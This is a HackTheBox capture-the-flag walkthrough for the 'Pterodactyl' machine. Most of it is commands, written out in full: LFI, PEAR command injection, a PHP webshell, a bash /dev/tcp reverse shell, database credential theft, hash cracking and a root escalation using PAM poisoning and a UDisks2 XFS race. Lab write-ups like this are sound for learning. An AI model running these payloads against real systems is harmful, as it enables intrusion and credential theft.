# HackTheBox -- Pterodactyl

## Complete Exploit Chain Walkthrough

Author: Jesse Ridley\
Platform: HackTheBox Season 10\
Difficulty: Hard\
Focus: LFI → PEAR exploitation → RCE → credential harvesting → privilege
escalation via PAM + XFS race

------------------------------------------------------------------------

# Overview

This machine demonstrates a **multi-stage exploitation chain**:

Recon\
↓\
LFI via locale.json\
↓\
PEAR command injection\
↓\
Remote Code Execution\
↓\
Reverse shell\
↓\
Database credential extraction\
↓\
Password hash cracking\
↓\
SSH login (phileasfogg3)\
↓\
PAM environment poisoning\
↓\
UDisks2 XFS race condition\
↓\
Root

------------------------------------------------------------------------

# Target

panel.pterodactyl.htb

HTB IP:

10.129.13.111

Attacker machine:

10.10.14.120

Listener port:

4444

------------------------------------------------------------------------

# 1 -- Recon

Initial port scanning:

rustscan -a 10.129.13.111 -r 1-65535

Open ports identified:

22 SSH\
80 HTTP

------------------------------------------------------------------------

# 2 -- Web Enumeration

Directory enumeration:

gobuster dir -u http://pterodactyl.htb -w
/usr/share/seclists/Discovery/Web-Content/common.txt -t 50

Discovery:

/locales\
/changelog.txt

Version discovered:

Pterodactyl Panel v1.20.x

------------------------------------------------------------------------

# 3 -- Local File Inclusion

Testing endpoint:

/locales/locale.json

Payload:

http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../etc/passwd

LFI confirmed.

------------------------------------------------------------------------

# 4 -- PEAR Command Injection

Access PEAR CLI via traversal.

Test:

curl -g
"http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&+config-show"

PEAR command execution confirmed.

------------------------------------------------------------------------

# 5 -- Write Webshell

Payload:

curl -g
'http://panel.pterodactyl.htb/locales/locale.json?+config-create+/\<?=system(\$\_GET\["cmd"\]);?\>+/tmp/shell.php&locale=../../../../../../usr/local/lib/php&namespace=pearcmd'

Execute:

curl http://panel.pterodactyl.htb/tmp/shell.php?cmd=id

Result:

uid=33(www-data)

------------------------------------------------------------------------

# 6 -- Reverse Shell

Listener:

nc -lvnp 4444

Encode payload:

echo -n 'bash -i \>& /dev/tcp/10.10.14.120/4444 0\>&1' \| base64

Result:

YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjAvNDQ0NCAwPiYx

Trigger:

curl http://panel.pterodactyl.htb/tmp/rev.php

Shell obtained:

www-data@pterodactyl

------------------------------------------------------------------------

# 7 -- Database Enumeration

Retrieve credentials:

/var/www/pterodactyl/.env

Connect:

mysql -u pterodactyl -pPteraPanel -h 127.0.0.1 panel

Dump users:

select username,password from users;

------------------------------------------------------------------------

# 8 -- Hash Cracking

Hash type:

bcrypt

Crack using:

hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

Password:

!QAZ2wsx

------------------------------------------------------------------------

# 9 -- SSH Access

ssh phileasfogg3@10.129.13.111

Password:

!QAZ2wsx

------------------------------------------------------------------------

# 10 -- User Flag

cat \~/user.txt

------------------------------------------------------------------------

# 11 -- Privilege Escalation

Chain:

CVE-2025-6018\
CVE-2025-6019

------------------------------------------------------------------------

# 12 -- PAM Environment Poisoning

Create environment override:

cat \<\< EOF \> \~/.pam_environment XDG_SEAT=seat0 XDG_VTNR=1
XDG_SESSION_TYPE=x11 XDG_SESSION_CLASS=user EOF

------------------------------------------------------------------------

# 13 -- Root Payload

xpl.c

#include \<unistd.h\>

int main(){ setuid(0); setgid(0); execl("/bin/sh","sh",NULL); }

Compile:

gcc xpl.c -o xpl

------------------------------------------------------------------------

# 14 -- Create XFS Image

dd if=/dev/zero of=xpl.img bs=1M count=300 mkfs.xfs -f xpl.img

Mount:

mkdir /tmp/mnt sudo mount -o loop xpl.img /tmp/mnt

Plant SUID:

cp xpl /tmp/mnt/ chown root:root /tmp/mnt/xpl chmod 4755 /tmp/mnt/xpl

Unmount:

sudo umount /tmp/mnt

Compress:

xz -9 xpl.img

Transfer:

scp xpl.img.xz phileasfogg3@pterodactyl.htb:/tmp

------------------------------------------------------------------------

# 15 -- Setup Loop

unxz xpl.img.xz

udisksctl loop-setup --file /tmp/xpl.img --no-user-interaction

Example:

Mapped file /tmp/xpl.img as /dev/loop5

------------------------------------------------------------------------

# 16 -- Trigger Race

Terminal 1:

while true; do gdbus call --system --dest org.freedesktop.UDisks2
--object-path /org/freedesktop/UDisks2/block_devices/loop5 --method
org.freedesktop.UDisks2.Filesystem.Resize 0 "{}" done

Terminal 2:

while true; do for d in /tmp/blockdev.\*; do "\$d/xpl" 2\>/dev/null &&
break 2 done done

Root shell appears.

------------------------------------------------------------------------

# 17 -- Root Flag

cd /root cat root.txt

------------------------------------------------------------------------

# Final Flags

user.txt\
root.txt
